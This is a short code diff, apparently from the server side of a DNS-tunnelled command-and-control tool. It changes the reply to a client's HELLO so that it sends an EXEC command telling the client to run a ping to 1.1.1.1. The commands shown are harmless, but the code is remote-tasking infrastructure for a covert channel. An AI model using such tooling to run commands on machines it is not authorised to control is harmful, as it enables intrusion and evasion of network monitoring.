@@ -221,14 +221,14 @@ def processQuery(query: bytes) -> bytes:
     data = message[17:]
 
     if command == CMD.HELLO:
-        return makeAnswerBytes(queryId, domain, makePayload(reqId, CMD.INFO, b"\x00"))
-        """
+        # return makeAnswerBytes(queryId, domain, makePayload(reqId, CMD.INFO, b"\x00"))
         return makeAnswerBytes(
             queryId,
             domain,
-            makePayload(reqId, CMD.EXEC, "/usr/bin/ls".encode("utf8")),
+            makePayload(
+                reqId, CMD.EXEC, "/usr/bin/ping -c1 -W2 1.1.1.1".encode("utf8")
+            ),
         )
-        """
 
     # elif command in [CMD.INFO, CMD.EXEC]:
     else:
